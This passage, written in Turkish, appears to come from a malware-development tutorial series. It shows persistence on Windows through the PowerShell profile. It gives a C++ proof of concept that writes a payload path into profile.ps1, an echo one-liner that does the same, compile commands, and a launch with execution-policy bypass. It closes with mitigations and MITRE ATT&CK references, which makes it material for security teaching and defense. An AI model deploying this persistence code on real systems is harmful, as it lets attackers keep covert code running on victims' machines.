\newpage
\subsection{77. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 11. PowerShell Profili. Basit C++ örneği.}

﷽

![pers](./images/70/2022-09-20_08-06.png){width="80%"}    

Bu gönderi, PowerShell profili aracılığıyla gerçekleştirilen ilginç bir kötü amaçlı yazılım kalıcılık tekniği üzerine kendi araştırmalarımın bir sonucudur.    

### powershell profili

Bir PowerShell profili, sistem yöneticilerinin ve son kullanıcıların ortamlarını yapılandırmalarına ve bir Windows PowerShell oturumu başladığında belirli komutları çalıştırmalarına olanak tanıyan bir PowerShell betiğidir.     

PowerShell profil betiği, `WindowsPowerShell` klasöründe saklanır:    

![pers](./images/70/2022-09-20_08-29.png){width="80%"}    

Hedef kullanıcının PowerShell profil dosyasına aşağıdaki kodu ekleyelim. Bu kod, enfekte olmuş kullanıcı bir PowerShell konsolu açtığında otomatik olarak çalıştırılacaktır:    

`Z:\2022-09-20-malware-pers-11\hack.exe`    

Her şeyi pratik bir örnekle göstereceğim ve böylece tüm süreci anlayacaksınız.    

### pratik örnek

Öncelikle, "kötü amaçlı" dosyamızı oluşturalım:     

```cpp
/*
hack.cpp
evil app for windows
persistence via powershell profile
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
*/
#include <windows.h>
#pragma comment (lib, "user32.lib")

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPSTR lpCmdLine, int nCmdShow) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Her zamanki gibi, bu sadece "meow-meow" mesaj kutusudur.    

Derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/70/2022-09-20_08-07.png){width="80%"}    

Daha sonra, doğruluğunu kontrol etmek için kurbanın makinesinde çalıştırabiliriz:    

![pers](./images/70/2022-09-20_09-03.png){width="80%"}    

Ardından bu basit “hileyi” yapıyoruz:   

```powershell
echo Z:\2022-09-20-malware-pers-11\hack.exe > 
"%HOMEPATH%\Documents\windowspowershell\profile.ps1"
```

Ve son olarak, PowerShell'i çalıştırın:    

```powershell
powershell -executionpolicy bypass
```

![pers](./images/70/2022-09-20_08-16.png){width="80%"}    

![pers](./images/70/2022-09-20_08-18.png){width="80%"}    

Gördüğünüz gibi, kötü amaçlı mantığımız beklendiği gibi çalıştı ve PowerShell, mesaj kutumuzun üst süreci oldu. =^..^=    

Basitleştirilmiş bir PoC kodu oluşturdum, bu işlemi otomatikleştirmek için:    

```cpp
/*
pers.cpp
windows persistence via Powershell profile
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/09/20/malware-pers-11.html
*/
#include <windows.h>
#include <stdio.h>
#include <strsafe.h>
#include <iostream>

int main(int argc, char* argv[]) {
  char path[MAX_PATH];
  char *homepath = getenv("USERPROFILE");
  char pspath[] = "\\Documents\\windowspowershell";
  char psprofile[] = "\\profile.ps1";
  char evil[] = "Z:\\2022-09-20-malware-pers-11\\hack.exe";
  DWORD evilLen = (DWORD)strlen(evil);

  StringCchCopy(path, MAX_PATH, homepath);
  StringCchCat(path, MAX_PATH, pspath);
  BOOL wd = CreateDirectoryA(path, NULL);
  if (wd == FALSE) {
    printf("unable to create dir: %s\n", path);
  } else {
    printf("successfully create dir: %s\n", path);
  }

  StringCchCat(path, MAX_PATH, psprofile);
  HANDLE hf = CreateFile(
    path,
    GENERIC_WRITE,
    0,
    NULL,
    CREATE_NEW,
    FILE_ATTRIBUTE_NORMAL,
    NULL
  );

  if (hf == INVALID_HANDLE_VALUE) {
    printf("unable to create file: %s\n", path);
  } else {
    printf("successfully create file: %s\n", path);
  }

  BOOL wf = WriteFile(hf, evil, evilLen, NULL, NULL);
  if (wf == FALSE) {
    printf("unable to write to file %s\n", path);
  } else {
    printf("successfully write to file evil path: %s\n", evil);
  }

  CloseHandle(hf);
  return 0;
}
```

Mantık basittir, bu betik sadece profil klasörünü oluşturur (eğer yoksa), ardından profil dosyasını oluşturur ve günceller.     

### demo

Her şeyi çalışırken görmek için PoC kodumuzu derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/70/2022-09-20_08-07_1.png){width="80%"}    

Ve bunu kurbanın makinesinde çalıştıralım:    

```powershell
.\pers.exe
```

![pers](./images/70/2022-09-20_08-09.png){width="80%"}    

![pers](./images/70/2022-09-20_08-11.png){width="80%"}    

Ve powershell oturumu başladığında:        

![pers](./images/70/2022-09-20_08-51.png){width="80%"}    

Process Hacker ile kontrol edersek:     

![pers](./images/70/2022-09-20_08-53.png){width="80%"}    

`powershell.exe` beklediğimiz gibi yine üst süreçtir.     

Gördüğünüz gibi her şey mükemmel çalıştı! =^..^=    

Ancak burada bir nüans var. Eğer powershell, yürütme politikası atlama modu olmadan çalıştırılırsa, bu kalıcılık yöntemi benim durumumda çalışmaz:    

![pers](./images/70/2022-09-20_09-05.png){width="80%"}    

Ayrıca, sahip olduğunuz ayrıcalıklara bağlı olarak kötüye kullanabileceğiniz dört farklı PowerShell profili yeri vardır:   

```powershell
$PROFILE | select *
```

![pers](./images/70/2022-09-20_09-08.png){width="80%"}    

PowerShell profil betiğine rastgele talimatlar ekleyerek, PowerShell profilleri birçok kod yürütme fırsatı sunar. Kullanıcının PowerShell'i başlatmasına güvenmemek için, belirli bir saatte PowerShell çalıştıran planlanmış bir görev kullanabilirsiniz.      

### önlemler

Yalnızca imzalı PowerShell betiklerinin çalıştırılmasını zorunlu kılın. Profilleri değiştirilmemeleri için imzalayın. Ayrıca, gerekmediğinde PowerShell profillerini devre dışı bırakabilirsiniz, örneğin `-No-Profile` bayrağıyla.    

Bu kalıcılık yöntemi vahşi doğada [Turla](https://attack.mitre.org/groups/G0010/) grubu tarafından kullanılmıştır.    

Umarım bu yazı, mavi takım üyelerinin bu ilginç teknik hakkında farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine bir silah daha ekler.

[Microsoft PowerShell profiles](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles?view=powershell-7.2)       
[MITRE ATT&CK. Event Triggered Execution: PowerShell Profile](https://attack.mitre.org/techniques/T1546/013/)     
[Turla](https://attack.mitre.org/groups/G0010/)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-09-20-malware-pers-11)    
